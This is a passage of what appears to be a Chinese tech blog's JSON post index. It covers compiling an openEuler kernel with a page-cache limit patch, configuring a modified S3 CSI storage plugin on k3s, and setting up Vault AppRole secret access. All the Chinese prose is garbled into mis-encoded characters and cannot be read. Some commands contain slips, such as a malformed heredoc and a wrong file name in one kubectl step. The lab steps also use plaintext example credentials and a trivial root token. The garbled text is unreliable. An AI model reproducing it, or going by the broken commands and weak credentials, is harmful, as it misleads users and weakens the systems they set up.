å¯ä»¥åå¤è¿›è¡Œå®‰è£…\n","date":"2025-08-08","img":"","permalink":"https://rendoumi.com/posts/20250808-k3s_install/","series":null,"tags":null,"title":"K3sçš„å®‰è£…"},{"categories":null,"content":"æ¬§æ‹‰ Page Cache çš„å†…æ ¸ç¼–è¯‘ PageCacheæä¾›äº†ä¸€ç§é™åˆ¶page cacheçš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿå¯¹page cacheçš„æ€»é‡è¿›è¡Œæ§åˆ¶, å¢å¼ºç³»ç»Ÿåœ¨æ•°æ®åº“ç­‰page cacheå æ¯”è¾ƒé«˜åœºæ™¯ä¸‹çš„ç¨³å®šæ€§ï¼Œç§¯æé‡Šæ”¾ç¼“å­˜ã€‚\nå®ƒæä¾›äº†ä»¥ä¸‹sysctlæ¥å£ï¼š\nvm.pagecache_limit_ratioï¼špagecacheå ç³»ç»Ÿæ€»å†…å­˜çš„ç™¾åˆ†æ¯”ï¼Œ[0, 100]ï¼Œ0å’Œ100éƒ½è¡¨ç¤ºåŠŸèƒ½å…³é—­ã€‚ vm.pagecache_limit_reclaim_ratioï¼šé’ˆå¯¹pagecacheçœŸå®å›æ”¶çš„æ¯”ä¾‹ï¼Œåœ¨å®é™…å›æ”¶æ—¶ï¼Œæ€»æ˜¯æ¯”pagecache_limit_ratioçš„å¤šå›æ”¶ä¸€äº›ï¼Œé»˜è®¤æ¯”ä¾‹æ˜¯2%ã€‚ vm.pagecache_limit_ignore_dirtyï¼šåœ¨å›æ”¶æ—¶æ˜¯å¦å¿½ç•¥è„é¡µï¼Œé»˜è®¤å¿½ç•¥ã€‚å› ä¸ºå¯¹è„é¡µçš„å›æ”¶è¾ƒè€—æ—¶ã€‚ è¡¥ä¸æ˜¯åŸºäº openEuler-22.03-LTS çš„ï¼Œä¸é€‚ç”¨äº 24.03-LTSï¼Œä»£ç éƒ½å·²ä¸åŒäº†\nç¼–è¯‘è¿‡ç¨‹å¦‚ä¸‹ï¼š\nä¸€ã€å®‰è£…å¥½openEuler-22.03-LTSï¼Œç£ç›˜ç•™å¤Ÿç©ºé—´ï¼Œæœ€å°‘ç•™20G\näºŒã€å®‰è£…ç¼–è¯‘å·²ç»æ‰€éœ€è½¯ä»¶\n1dnf install -y rpm-build openssl-devel bc rsync gcc gcc-c++ flex bison m4 elfutils-libelf-devel 2dnf install -y python 3dnf install -y ncurses-devel 4dnf install -y dwarves ä¸‰ã€å®‰è£…å†…æ ¸æºä»£ç \n1dnf install -y kernel-source ç°åœ¨æ˜¯2024å¹´11æœˆ4æ—¥ï¼Œå†…æ ¸ç‰ˆæœ¬æ˜¯ linux-5.10.0-60.139.0.166.oe2203.x86_64ï¼Œæ³¨æ„è¡¥ä¸çš„é€‚ç”¨èŒƒå›´\nå››ã€æ‰“è¡¥ä¸\npage.patch å°†page.patch æ”¾åˆ° /usr/src\n1cd /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64 2patch -p1 \u0026lt; ../page.patch äº”ã€ç¼–è¾‘å†…æ ¸ç‰ˆæœ¬å·ï¼ŒEXTRAVERSIONçš„ç‰ˆæœ¬å·è¦å¤§äºå½“å‰å†…æ ¸ç‰ˆæœ¬ï¼Œå¦åˆ™æ— æ³•å®‰è£…ã€‚å½“å‰æ˜¯166ï¼Œæ”¹æˆ+1ï¼Œ167\n1cd /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64 2 3vi Makefile 4# SPDX-License-Identifier: GPL-2.0 5VERSION = 5 6PATCHLEVEL = 10 7SUBLEVEL = 0 8EXTRAVERSION = -60.139.0.167.oe2203.x86_64 9NAME = Kleptomaniac Octopus 10OPENEULER_MAJOR = 2203 11OPENEULER_MINOR = 0 å…­ã€ç¼–è¯‘\n1cd /usr/src/linux-5.10.0-60.139.0.166.oe2203.x86_64 2 3make openeuler_defconfig 4 5#æ ¹æ®cpuçš„æ ¸æ•°æ¥è°ƒæ•´-jåé¢çš„å‚æ•° 6make binrpm-pkg -j8 7 8#æŠ¥ä¸¤ä¸ªé”™ï¼Œignore 9mm/vmscan.c:4306:22: warning: â€˜global_reclaimable_pagesâ€™ defined but not used [-Wunused-function] 10 4306 | static unsigned long global_reclaimable_pages(void) 11 | ^~~~~~~~~~~~~~~~~~~~~~~~ 12 13kernel/sysctl.c: In function â€˜pc_reclaim_limit_proc_dointvecâ€™: 14kernel/sysctl.c:715:2: warning: ISO C90 forbids mixed declarations and code [-Wdeclaration-after-statement] 15 715 | int pre_reclaim_ratio = vm_pagecache_limit_reclaim_ratio; 16 | ^~~ 17 18#ç”Ÿæˆçš„åŒ…æ”¾åœ¨å¦‚ä¸‹ç›®å½•ä¸‹ 19/root/rpmbuild ä¸ƒã€å®‰è£…ç¼–è¯‘å¥½çš„å†…æ ¸\n1rpm -ivh /root/rpmbuild/RPMS/x86_64/kernel-headers-5.10.0_60.139.0.167.oe2203.x86_64-1.x86_64.rpm å…«ã€ä¿®æ”¹å¯åŠ¨é¡¹\n1cat /boot/grub2/grub.cfg | grep -E \u0026#34;menuentry \u0026#39;\u0026#34; 2 3grub2-set-default 0 ä¹ã€æŸ¥çœ‹æ–°å†…æ ¸\n1uname -a 2Linux localhost.localdomain 5.10.0-60.139.0.167.oe2203.x86_64 #1 SMP Mon Nov 4 15:49:50 CST 2024 x86_64 x86_64 x86_64 GNU/Linux ","date":"2025-08-08","img":"","permalink":"https://rendoumi.com/posts/20250808-openeuler_pagecache/","series":null,"tags":null,"title":"æ¬§æ‹‰PageCacheçš„å†…æ ¸ç¼–è¯‘"},{"categories":null,"content":"æå®¢å¤©æˆæœ‰ä¸ªå¾ˆå‰å®³çš„scaleflashç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œå……åˆ†åˆ©ç”¨rdmaçš„æ— æŸç½‘ç»œç‰¹æ€§ï¼Œå¹¶è¿›ä¸€æ­¥å‘æ‰¬å…‰å¤§ã€‚ç ”å‘å‡ºæ¥äº†å¯ä»¥é¡¶æ›¿EMCç›˜é˜µçš„å­˜å‚¨ç³»ç»Ÿï¼Œå¯ä»¥åœ¨å…¶ä¸Šè·‘Oracleç­‰æ•°æ®åº“ç³»ç»Ÿï¼ŒçœŸçš„æ˜¯å›½è´§ä¹‹å…‰äº†ã€‚\nå¸®å®ƒä»¬æ”¹å†™äº†ä¸€ä¸ªcsiçš„å­˜å‚¨æ’ä»¶ï¼Œè®°å½•ä¸€ä¸‹ï¼ŒåŸºäºyandexçš„s3 csiè€Œæ¥ï¼Œè¿™æ ·æ—¢å¯ä»¥è·‘åˆ°åº•å±‚ä¸Šæä¾›æ–‡ä»¶å—è®¾å¤‡ï¼Œä¹Ÿå¯ä»¥ä¸Šå‡åˆ°ç±»ä¼¼NFSæˆ–è€…S3çš„å±‚æ¬¡æä¾›æ–‡ä»¶ç³»ç»Ÿï¼Œèƒ½æ»¡è¶³å¤§å¤šæ•°éœ€æ±‚ã€‚é‚£æºä»£ç å°±ç»å¯¹ä¸æä¾›äº†ï¼Œåªè¯´ä¸€ä¸‹è¿‡ç¨‹ï¼š\nCSI PLUGINçš„ä½¿ç”¨æ–¹æ³•ï¼š ä¸€ã€å¯¼å…¥é•œåƒ csiå­˜å‚¨æ’ä»¶çš„image\n1cr.yandex/crp9ftr22d26age3hulg/csi-s3:0.42.66 æ–‡ä»¶ï¼šcsi.tar\nå°†æ–‡ä»¶æ”¾åˆ°æ‰€æœ‰worknodeä¸Šï¼Œå¯¼å…¥æœ¬åœ°é•œåƒåº“:\n1ctr --address /run/k3s/containerd/containerd.sock -n k8s.io images import /root/csi.tar 2 3crictl -r unix:///run/k3s/containerd/containerd.sock images çœ‹åˆ°æœ‰ cr.yandex/crp9ftr22d26age3hulg/csi-s3:0.42.66 æ—¢æ˜¯å¯¼å…¥æˆåŠŸ\näºŒã€å®‰è£…controllerå’Œnodeserver å®‰è£…driver\næ–‡ä»¶ï¼šdriver.yaml\n1kubectl apply -f driver.yaml å®‰è£…controller\næ–‡ä»¶ï¼šcontroller.yaml\n1kubectl apply -f controller.yaml å®‰è£…nodeserver\næ–‡ä»¶ï¼šnodeserver.yaml\nè§£é‡Šä¸€ä¸‹ï¼Œcontrolleræ˜¯ä¸€ä¸ªstatefulsetï¼Œæ•´ä¸ªé›†ç¾¤è¿è¡Œä¸€ä¸ªå³å¯ï¼›è€Œnodeservershiåˆ™æ˜¯ä¸€ä¸ªdaemonsetï¼Œæ¯ä¸ªworknodeéƒ½ä¼šè¿è¡Œä¸€ä¸ªå‰¯æœ¬\nä¸Šé¢ worknode æ˜¯3ä¸ªï¼Œæ‰€ä»¥æœ‰3ä¸ªå‰¯æœ¬\nä¸‰ã€scaleflash å—è®¾å¤‡çš„ä½¿ç”¨ å—è®¾å¤‡æœ€å°å•ä½æ˜¯Gï¼Œæ‰€ä»¥å¦‚æœéœ€æ±‚äº†100Mï¼Œé‚£ä¹Ÿæ˜¯1Gã€‚\né¦–å…ˆå¿…é¡»å®šä¹‰ä¸€ä¸ªstorageclassï¼Œä»¥åä½¿ç”¨è¿™ä¸€ä¸ªstorageclasså°±å¯ä»¥äº†ï¼š\n1cat \u0026lt;\u0026lt; EOF \u0026gt;scaleflash-storageclass.yaml 2--- 3kind: StorageClass 4apiVersion: storage.k8s.io/v1 5metadata: 6 name: scaleflash 7provisioner: ru.yandex.s3.csi 8parameters: 9 mounter: scaleflash 10 clstID: \u0026#34;nvmatrix_101\u0026#34; 11 fsType: \u0026#34;xfs\u0026#34; 12EOF 13 14kubectl apply -f scaleflash-storageclass.yaml å†å®šä¹‰pvc\n1cat \u0026lt;\u0026lt; EOF \u0026gt; csi-pvc.yaml 2apiVersion: v1 3kind: PersistentVolumeClaim 4metadata: 5 name: csi-pvc 6 namespace: default 7spec: 8 accessModes: 9 - ReadWriteOnce 10 resources: 11 requests: 12 storage: 100M 13 storageClassName: scaleflash 14EOF 15 16kubectl apply -f csi-pvc.yaml å®šä¹‰Podä½¿ç”¨è¿™ä¸ªpvc\n1cat \u0026lt;\u0026lt; EOF \u0026gt; nginx-csi-pvc.yaml 2--- 3apiVersion: v1 4kind: Pod 5metadata: 6 name: nginx-pod-s3 7spec: 8 containers: 9 - name: nginx-pod-s3 10 image: docker.io/library/nginx:latest 11 imagePullPolicy: IfNotPresent 12 volumeMounts: 13 - mountPath: \u0026#34;/usr/share/nginx/html\u0026#34; 14 name: dynamic-storage 15 volumes: 16 - name: dynamic-storage 17 persistentVolumeClaim: 18 claimName: csi-pvc 19EOF 20 21kubectl apply -f nginx-csi-pvc.yaml è¿›å…¥podï¼Œçœ‹åˆ°lunå·²ç»è¢«mountä¸Šäº†ï¼Œå°±okäº†\nåå‘åˆ é™¤æ‰Podå’Œpvcèµ„æºï¼š\n1kubectl delete -f nginx-csi-pvc.yaml 2kubectl delete -f csi-pvc.yaml éªŒè¯statefulset:\n1cat \u0026lt;\u0026lt; EOF \u0026gt; stateful.yaml 2apiVersion: apps/v1 3kind: StatefulSet 4metadata: 5 name: statefulset-smb 6 namespace: default 7 labels: 8 app: nginx 9spec: 10 serviceName: statefulset-smb 11 replicas: 3 12 template: 13 metadata: 14 labels: 15 app: nginx 16 spec: 17 containers: 18 - name: statefulset-smb 19 image: docker.io/library/nginx:latest 20 imagePullPolicy: IfNotPresent 21 command: 22 - \u0026#34;/bin/bash\u0026#34; 23 - \u0026#34;-c\u0026#34; 24 - set -euo pipefail; while true; do echo $(date) \u0026gt;\u0026gt; /mnt/data/outfile; sleep 1; done 25 volumeMounts: 26 - name: persistent-storage 27 mountPath: /mnt/data 28 readOnly: false 29 updateStrategy: 30 type: RollingUpdate 31 selector: 32 matchLabels: 33 app: nginx 34 volumeClaimTemplates: 35 - metadata: 36 name: persistent-storage 37 namespace: default 38 spec: 39 storageClassName: scaleflash 40 accessModes: 41 - ReadWriteOnce 42 resources: 43 requests: 44 storage: 1Gi 45EOF 46 47kubectl apply -f stateful.yaml å¯ä»¥æ”¾ç¼©å‰¯æœ¬æ•°ï¼Œç„¶åè§‚å¯Ÿ /mnt/data/outfile æ˜¯å¦å¸¦æœ‰åˆšå¯åŠ¨æ—¶å€™çš„æ—¶é—´æˆ³æ¥ç¡®å®šå·æ˜¯å¦æ˜¯ä¿ç•™çš„ã€‚\nå››ã€nvfileçš„ä½¿ç”¨ï¼ˆç±»ä¼¼NFSï¼‰ æ³¨æ„ç‚¹ï¼šrootPath å¿…é¡»æ˜¯å­˜åœ¨/mntä¸‹ï¼Œå› ä¸ºåªæœ‰/mntè¢«æŒ‚è¿›äº†controllerï¼ŒæŒ‚/è¿›å»æ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥å…¶å®ƒçš„éƒ½æ— æ³•è¯†åˆ«å‡ºæ¥\nå·å®¹é‡å¤§å°è·ŸNFSä¸€æ ·æ²¡æœ‰æ„ä¹‰ï¼Œå†™äº†ä¹Ÿä¸èµ·ä»»ä½•ä½œç”¨ã€‚\nå®šä¹‰storageclass\n1cat \u0026lt;\u0026lt; EOF \u0026gt; storageclass01.yaml 2--- 3kind: StorageClass 4apiVersion: storage.k8s.io/v1 5metadata: 6 name: nvfile 7provisioner: ru.yandex.s3.csi 8parameters: 9 mounter: nvfile 10 rootPath: \u0026#34;/mnt/nvfile\u0026#34; 11 modePerm: \u0026#34;0777\u0026#34; 12EOF 13 14kubectl apply -f storageclass01.yaml æ³¨æ„ä¸Šé¢ï¼Œæ²¡æœ‰å®šä¹‰subPathï¼Œæ‰€ä»¥æ–°ç›®å½•éƒ½ä¼šè¢«å»ºç«‹åœ¨/mnt/nvfileä¸‹ã€‚\nå¦‚æœè¦å®šä¹‰åœ¨æŸä¸ªå­ç›®å½•ï¼ˆæ¯”å¦‚prodï¼‰ä¸‹ï¼Œ å¯ä»¥å†å®šä¹‰ä¸€ä¸ªstorageClassï¼Œåˆ°æ—¶å€™å¼•ç”¨è¿™ä¸ªæ–°storageclasså³å¯\n1--- 2kind: StorageClass 3apiVersion: storage.k8s.io/v1 4metadata: 5 name: nvfile-prod 6provisioner: ru.yandex.s3.csi 7parameters: 8 mounter: nvfile 9 rootPath: \u0026#34;/mnt/nvfile\u0026#34; 10 subPath: \u0026#34;/prod\u0026#34; 11 modePerm: \u0026#34;0777\u0026#34; å®šä¹‰pvc\n1cat \u0026lt;\u0026lt; EOF \u0026gt; nvfile-pvc.yaml 2--- 3apiVersion: v1 4kind: PersistentVolumeClaim 5metadata: 6 name: nvfile-pvc 7 namespace: default 8spec: 9 accessModes: 10 - ReadWriteOnce 11 resources: 12 requests: 13 storage: 100M 14 storageClassName: nvfile 15EOF 16 17kubectl apply -f nvfile-pvc.yaml å®šä¹‰ä¸€ä¸ªPodï¼Œä½¿ç”¨ä¸Šé¢çš„pvc\n1cat \u0026lt;\u0026lt; EOF \u0026gt; nginx-nvfile.yaml 2--- 3apiVersion: v1 4kind: Pod 5metadata: 6 name: nginx-nvfile 7spec: 8 containers: 9 - name: nginx-nvfile 10 image: docker.io/library/nginx:latest 11 imagePullPolicy: IfNotPresent 12 volumeMounts: 13 - mountPath: \u0026#34;/usr/share/nginx/html\u0026#34; 14 name: dynamic-storage 15 volumes: 16 - name: dynamic-storage 17 persistentVolumeClaim: 18 claimName: nvfile-pvc 19EOF 20 21kubectl apply -f nginx-nvfile.yaml è¿›å…¥å®¹å™¨ï¼Œçœ‹åˆ°nvfile_nodevçš„mountç‚¹å°±æ˜¯æˆåŠŸ\nstatefulsetçš„éªŒè¯ï¼š\n1cat \u0026lt;\u0026lt; EOF \u0026gt; stateful-nvfile.yaml 2--- 3apiVersion: apps/v1 4kind: StatefulSet 5metadata: 6 name: statefulset-nvfile-ng 7 namespace: default 8 labels: 9 app: nvfile-nginx 10spec: 11 serviceName: statefulset-nvfie-ng 12 replicas: 3 13 template: 14 metadata: 15 labels: 16 app: nvfile-nginx 17 spec: 18 containers: 19 - name: statefulset-nvfile-ng 20 image: docker.io/library/nginx:latest 21 imagePullPolicy: IfNotPresent 22 command: 23 - \u0026#34;/bin/bash\u0026#34; 24 - \u0026#34;-c\u0026#34; 25 - set -euo pipefail; while true; do echo $(date) \u0026gt;\u0026gt; /mnt/smb/outfile; sleep 1; done 26 volumeMounts: 27 - name: pvc 28 mountPath: /mnt/smb 29 readOnly: false 30 updateStrategy: 31 type: RollingUpdate 32 selector: 33 matchLabels: 34 app: nvfile-nginx 35 volumeClaimTemplates: 36 - metadata: 37 name: pvc 38 spec: 39 storageClassName: nvfile 40 accessModes: [\u0026#34;ReadWriteOnce\u0026#34;] 41 resources: 42 requests: 43 storage: 1Gi 44EOF 45 46kubectl apply -f stateful-nvfile.yaml åŒæ ·è¿›è¡Œä¼¸ç¼©ï¼ŒæŸ¥çœ‹mountç‚¹ä¸Šçš„æ–‡ä»¶/mnt/smb/outfileï¼Œæ˜¯å¦å¸¦æœ‰åˆšå¯åŠ¨æ—¶å€™çš„æ—¶é—´æˆ³æ¥åˆ¤æ–­æ˜¯å¦ä¸ºåŸå§‹å·\näº”ã€S3çš„ä½¿ç”¨ S3çš„è¯å°±æ²¡æœ‰ä»»ä½•çº¦æŸï¼Œåªè¦èƒ½è·‘S3åè®®ï¼Œè™šæœºä¹Ÿå¯ä»¥ç”¨ã€‚\né¦–å…ˆå»ºç«‹ä¸ªminioçš„S3æ¥æ¨¡æ‹Ÿï¼Œå› ä¸º9000ç«¯å£è¢«å ï¼Œæ‰€ä»¥ç”¨8000ç«¯å£\nhttp://192.168.66.101:8000\nusername: abcdefg\npassword: abcdefg\nè¿›å…¥åï¼Œgenä¸€å¯¹keyï¼Œèµ‹äºˆS3çš„æ‰€æœ‰æƒé™ï¼Œç¡®ä¿å¯ä»¥å»ºç«‹æ–°bucket\n1{ 2 \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, 3 \u0026#34;Statement\u0026#34;: [ 4 { 5 \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, 6 \u0026#34;Action\u0026#34;: [ 7 \u0026#34;s3:*\u0026#34; 8 ], 9 \u0026#34;Resource\u0026#34;: [ 10 \u0026#34;arn:aws:s3:::*\u0026#34; 11 ] 12 } 13 ] 14} key:\n1 accessKeyID: lj7mL2gAFgRCykTaaabbb 2 secretAccessKey: 0YklYzUmcxYcPjZKtmvHRN3cMQrUaCraaaabbbb ç„¶åå»ºç«‹secret\n1cat \u0026lt;\u0026lt; EOF \u0026gt; secret-s3.yaml 2--- 3apiVersion: v1 4kind: Secret 5metadata: 6 name: csi-s3-secret 7 # Namespace depends on the configuration in the storageclass.yaml 8 namespace: kube-system 9stringData: 10 accessKeyID: lj7mL2gAFgRCyaaaabbbb 11 secretAccessKey: 0YklYzUmcxYcPjZKtmvHRN3cMQrUaCraaaabbbb 12 # For AWS set it to \u0026#34;https://s3.\u0026lt;region\u0026gt;.amazonaws.com\u0026#34;, for example https://s3.eu-central-1.amazonaws.com 13 endpoint: http://192.168.66.101:8000 14 # For AWS set it to AWS region 15 #region: \u0026#34;\u0026#34; 16EOF 17 18kubectl apply -f secret-s3.yaml å†å»ºç«‹storageclass\n1cat \u0026lt;\u0026lt; EOF \u0026gt; s3-storageclass.yaml 2--- 3kind: StorageClass 4apiVersion: storage.k8s.io/v1 5metadata: 6 name: csi-s3 7provisioner: ru.yandex.s3.csi 8parameters: 9 mounter: geesefs 10 # you can set mount options here, for example limit memory cache size (recommended) 11 options: \u0026#34;--memory-limit 1000 --dir-mode 0777 --file-mode 0666\u0026#34; 12 # to use an existing bucket, specify it here: 13 #bucket: some-existing-bucket 14 csi.storage.k8s.io/provisioner-secret-name: csi-s3-secret 15 csi.storage.k8s.io/provisioner-secret-namespace: kube-system 16 csi.storage.k8s.io/controller-publish-secret-name: csi-s3-secret 17 csi.storage.k8s.io/controller-publish-secret-namespace: kube-system 18 csi.storage.k8s.io/node-stage-secret-name: csi-s3-secret 19 csi.storage.k8s.io/node-stage-secret-namespace: kube-system 20 csi.storage.k8s.io/node-publish-secret-name: csi-s3-secret 21 csi.storage.k8s.io/node-publish-secret-namespace: kube-system 22EOF 23 24kubectl apply -f s3-storageclass.yaml å»ºç«‹pvc\n1cat \u0026lt;\u0026lt; EOF \u0026gt; pvc-s3.yaml 2--- 3apiVersion: v1 4kind: PersistentVolumeClaim 5metadata: 6 name: csi-s3-pvc 7 namespace: default 8spec: 9 accessModes: 10 - ReadWriteMany 11 resources: 12 requests: 13 storage: 5Gi 14 storageClassName: csi-s3 15EOF 16 17kubectl apply -f csi-s3.yaml å»ºç«‹pod\n1cat \u0026lt;\u0026lt; EOF \u0026gt; nginx-s3.yaml 2--- 3apiVersion: v1 4kind: Pod 5metadata: 6 name: csi-s3-test-nginx 7 namespace: default 8spec: 9 containers: 10 - name: csi-s3-test-nginx 11 image: docker.io/library/nginx:latest 12 imagePullPolicy: IfNotPresent 13 volumeMounts: 14 - mountPath: /usr/share/nginx/html/s3 15 name: webroot 16 volumes: 17 - name: webroot 18 persistentVolumeClaim: 19 claimName: csi-s3-pvc 20 readOnly: false 21EOF 22 23kubectl apply -f nginx-s3.yaml è¿›å…¥å®¹å™¨ï¼Œçœ‹åˆ°ä¸€ä¸ªpvcçš„å·å³å¯\nå»minioçš„ç•Œé¢ï¼Œçœ‹åˆ°è¿™ä¸ªæ–°å·å¯¹åº”çš„æ¡¶\nstatefulsetä¹Ÿä¸€æ ·ã€‚\ns3æ›´å…·ä½“çš„å¯ä»¥å‚çœ‹ï¼šhttps://github.com/yandex-cloud/k8s-csi-s3/\n","date":"2025-08-07","img":"","permalink":"https://rendoumi.com/posts/20250807-csi_scaleflash/","series":null,"tags":null,"title":"ä¸ºæå®¢å¤©æˆæ”¹å†™ä¸€å¥—CSIå­˜å‚¨æ’ä»¶"},{"categories":null,"content":"Vaultæ˜¯ä¸ªå¾ˆå‰å®³çš„ secret å¼•æ“äº†ï¼Œä¸å¤šè¯´äº†ï¼Œä¸»è¦ç”¨äºé›†ä¸­ç®¡ç†å„ç§å¯†ç ã€å¯†é’¥ã€‚\nç”¨æ¥ç®¡ç†Kubernetesçš„å‡­æ®ç›¸å½“å¥½ï¼Œä½†æ˜¯æˆ‘ä»¬é€šå¸¸æ˜¯è‡ªå·±å¼€å‘çš„ç¨‹åºï¼Œç„¶åéœ€è¦è¯»å„ç§é…ç½®æ–‡ä»¶ï¼Œæ¯”å¦‚è¿æ¥DBçš„ç”¨æˆ·åï¼Œå¯†ç ç­‰ç­‰ï¼Œæœ€åè¿æ¥åˆ°æ•°æ®åº“ã€‚\né‚£ä¹ˆè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœç®¡ç†å¥½é…ç½®é¡¹å‘¢ï¼Ÿ\næ–¹æ³•å¦‚ä¸‹ï¼Œç”¨approleè¯»å–Vaultçš„é…ç½®ä¿¡æ¯ï¼š\nä¸€ã€å¯åŠ¨vaultå¼•æ“æµ‹è¯•ç¯å¢ƒ é¦–å…ˆå¯åŠ¨vaultå¼•æ“ï¼Œæµ‹è¯•ï¼Œç”¨Dockerï¼Œæ–¹ä¾¿åˆ›å»ºå’Œé”€æ¯\n1# å¯åŠ¨å®¹å™¨ 2# æˆ‘ä»¬æ‰‹åŠ¨æŒ‡å®šäº†ROOT_TOKENæ˜¯rootï¼Œè¿™åªç”¨äºæµ‹è¯•ç¯å¢ƒ 3docker run -d --rm \\ 4 --add-host host.docker.internal:host-gateway \\ 5 --cap-add=IPC_LOCK \\ 6 --name vault \\ 7 -p 8200:8200 \\ 8 -e VAULT_DEV_ROOT_TOKEN_ID=root \\ 9 -e VAULT_DEV_LISTEN_ADDRESS=0.0.0.0:8200 \\ 10 hashicorp/vault --add-host host.docker.internal:host-gateway è¿™ä¸ªä¸ªå‚æ•°çš„ä½œç”¨æ˜¯åœ¨å®¹å™¨çš„ /etc/hosts æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªä¸»æœºåå’Œ IP åœ°å€çš„æ˜ å°„ã€‚\n--add-host: è¿™æ˜¯ docker run çš„ä¸€ä¸ªé€‰é¡¹ï¼Œç”¨æ¥åœ¨å®¹å™¨çš„ /etc/hosts æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªè‡ªå®šä¹‰çš„ä¸»æœºæ¡ç›®ã€‚ host.docker.internal: è¿™æ˜¯ä¸»æœºåã€‚åœ¨ Docker Desktopï¼ˆmacOS å’Œ Windowsï¼‰ä¸­ï¼Œhost.docker.internal æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„ DNS åç§°ï¼Œå®ƒä¼šè¢«è§£æä¸ºå®¿ä¸»æœºçš„å†…éƒ¨ IP åœ°å€ã€‚ host-gateway: è¿™æ˜¯ docker åœ¨è¾ƒæ–°ç‰ˆæœ¬ä¸­å¼•å…¥çš„ä¸€ä¸ªç‰¹æ®Šå…³é”®å­—ã€‚å®ƒä»£è¡¨äº†å®¿ä¸»æœºä¸ Docker ç½‘ç»œä¹‹é—´çš„ç½‘å…³ IP åœ°å€ã€‚åœ¨è®¸å¤š Linux ç¯å¢ƒä¸­ï¼Œè¿™ä¸ªå…³é”®å­—ä¼šæŒ‡å‘ Docker çš„ç½‘æ¡¥ IPï¼ˆä¾‹å¦‚ 172.17.0.1ï¼‰ã€‚ ç»¼åˆèµ·æ¥ï¼Œ--add-host host.docker.internal:host-gateway çš„ä½œç”¨æ˜¯ï¼š\nåœ¨å®¹å™¨å†…éƒ¨åˆ›å»ºä¸€ä¸ª DNS æ¡ç›®ï¼Œå°† host.docker.internal è¿™ä¸ªåå­—æ˜ å°„åˆ°å®¿ä¸»æœºçš„ IP åœ°å€ã€‚è¿™ä½¿å¾—å®¹å™¨ä¸­çš„åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡ host.docker.internal è¿™ä¸ªåŸŸåæ¥è®¿é—®å®¿ä¸»æœºä¸Šè¿è¡Œçš„æœåŠ¡ï¼Œè€Œæ— éœ€çŸ¥é“å®¿ä¸»æœºçš„å…·ä½“ IP åœ°å€ã€‚\nè¿™å¯¹äºå¼€å‘ç¯å¢ƒéå¸¸æœ‰ç”¨ï¼Œæ¯”å¦‚ä½ çš„ Vault å®¹å™¨éœ€è¦è®¿é—®åœ¨å®¿ä¸»æœºä¸Šè¿è¡Œçš„æ•°æ®åº“æˆ–è®¤è¯æœåŠ¡ã€‚\nå®¹å™¨è·‘èµ·æ¥ä¹‹åæˆ‘ä»¬éªŒè¯ä¸€ä¸‹ï¼š\n1export VAULT_ADDR=\u0026#34;http://127.0.0.1:8200\u0026#34; 2export VAULT_TOKEN=\u0026#34;root\u0026#34; 3 4vault status ç„¶åæˆ‘ä»¬æ‰“å¼€æµè§ˆå™¨ï¼šhttp://x.x.x.x:8200ï¼Œä½¿ç”¨Token rootç™»å½•\nçœ‹çœ‹æœ‰å•¥secretå¼•æ“ï¼Œè¿˜çœŸä¸å°‘\næ¥ä¸‹æ¥çš„æ“ä½œå°½é‡éƒ½æ˜¯åœ¨CLIå‘½ä»¤è¡Œå®Œæˆäº†ã€‚\näºŒã€åˆå§‹åŒ–å„ç§é…ç½®ä¿¡æ¯ 1export VAULT_ADDR=\u0026#34;http://127.0.0.1:8200\u0026#34; 2export VAULT_TOKEN=\u0026#34;root\u0026#34; 3 4# æ”¾å…¥æµ‹è¯•æ•°æ® 5vault kv put secret/dbinfo user=root pass=test123 6 7# è®¾ç½®approleçš„è®¤è¯æ–¹å¼ 8vault auth enable approle 9 10# ç¼–è¾‘ä¸€ä¸ªpolicyæ–‡ä»¶ï¼Œagent-policy.hcl 11cat \u0026lt; EOF \u0026gt; agent-policy.hcl 12path \u0026#34;secret/data/dbinfo\u0026#34; { 13 capabilities = [\u0026#34;read\u0026#34;] 14} 15EOF 16 17# å†™å…¥policy 18vault policy write agent-policy agent-policy.hcl 19 20# å»ºç«‹AppRole å¹¶é™„åŠ policy 21vault write auth/approle/role/vault-agent-role policies=\u0026#34;agent-policy\u0026#34; 22 23# genå‡º role-id å’Œ secret-id 24vault read auth/approle/role/vault-agent-role/role-id 25vault write -f auth/approle/role/vault-agent-role/secret-id 26 27# æŠŠ role-id å’Œ secert-id æ”¾å…¥æ–‡ä»¶ 28vault read -field role_id auth/approle/role/vault-agent-role/role-id \u0026gt; role-id 29æˆ– 30vault read auth/approle/role/vault-agent-role/role-id -format=json | jq -r .data.role_id \u0026gt; role-id 31 32# æ³¨æ„ï¼Œæ¯æ¬¡å†™éƒ½ä¼šå˜çš„ 33vault write -f -field secret_id auth/approle/role/vault-agent-role/secret-id \u0026gt; secret-id 34æˆ– 35vault write -f auth/approle/role/vault-agent-role/secret-id -format=json | jq -r .data.secret_id \u0026gt; secret-id 36 37unset VAULT_ADDR 38unset VAULT_TOKEN æ³¨æ„ä¸Šé¢ä¸€ç³»åˆ—æ“ä½œï¼Œè·ŸIAMçš„æ“ä½œåŸºæœ¬ä¸€æ‘¸ä¸€æ ·ï¼Œå¦‚å‡ºä¸€è¾™ï¼Œå…ˆå®šä¹‰policyï¼Œç„¶åpolicyé™„åŠ roleï¼Œroleå†genå‡ºrole-idå’Œsecret-id\né‚£role-idå°±ç›¸å½“äºusernameï¼Œé‚£secret-idå°±ç›¸å½“äºpasswordï¼Œè¿™ä¹ˆç†è§£å°±å¯¹äº†ã€‚\nä¸‰ã€é…ç½®Vault Agentä»£ç†ï¼ŒåŠ¨æ€ä»Vaultè·å–é…ç½®ä¿¡æ¯ï¼Œå¹¶é€šè¿‡æ¨¡æ¿è¾“å‡º è®¾ç½®vault-agent.hclï¼š\n1vault { 2 address = \u0026#34;http://127.0.0.1:8200\u0026#34; 3 token = \u0026#34;root\u0026#34; 4} 5 6auto_auth { 7 method { 8 type = \u0026#34;approle\u0026#34; 9 config = { 10 role_id_file_path = \u0026#34;./role-id\u0026#34; 11 